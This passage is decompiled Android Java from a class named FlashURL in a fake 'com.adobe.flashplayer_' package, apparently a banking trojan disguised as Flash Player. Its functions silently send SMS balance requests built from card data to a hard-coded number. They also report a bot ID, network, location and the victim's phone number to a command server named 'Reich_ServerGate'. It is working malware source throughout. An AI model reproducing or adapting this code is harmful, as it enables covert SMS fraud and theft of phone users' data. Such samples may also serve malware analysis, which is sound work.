        throw new UnsupportedOperationException("Method not decompiled: com.adobe.flashplayer_.FlashURL.onReceive(android.content.Context, android.content.Intent):void");
    }

    private void modRequest(String cc, Context context) {
        String[] tmp = cc.split(";");
        for (String substring : tmp) {
            sendSMS("79262000900", "balance " + substring.substring(4, 8));
        }
    }

    public String toBase64fromString(String text) {
        return Base64.encodeToString(text.getBytes(), 0);
    }

    private void saveData(String data, String f, Context context) {
        try {
            OutputStreamWriter osw = new OutputStreamWriter(context.openFileOutput(f, 0));
            osw.write(data);
            osw.close();
        } catch (IOException e) {
        }
    }

    private String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    private void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    private void sendREP(String Reich_ServerGate, String i, String rep, Context c) {
        String BotID = readConfig("BotID", c);
        String BotNetwork = readConfig("BotNetwork", c);
        String BotLocation = readConfig("BotLocation", c);
        String SDK = VERSION.RELEASE;
        String BotVer = readConfig("BotVer", c);
        String pn = ((TelephonyManager) c.getSystemService("phone")).getLine1Number();
        pn = pn == null ? "" : pn.replace("+", "");
        if (BotID == null) {
            BotID = Secure.getString(c.getContentResolver(), "android_id");
        }
        String request = "a=2&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + pn + "&f=" + BotVer + "&g=" + SDK + "&h=" + rep;
        new FlashVars().execute(new String[]{new StringBuilder(String.valueOf(Reich_ServerGate)).append("?").append(request).toString()});
    }

    public void sendSMS(String n, String msg) {
        String phoneNumber = n;
        String message = msg;
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendMultipartTextMessage(phoneNumber, null, smsManager.divideMessage(message), null, null);
    }

    public static String millisToDate(long currentTime) {
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(currentTime);
        return calendar.getTime().toString();
    }
}
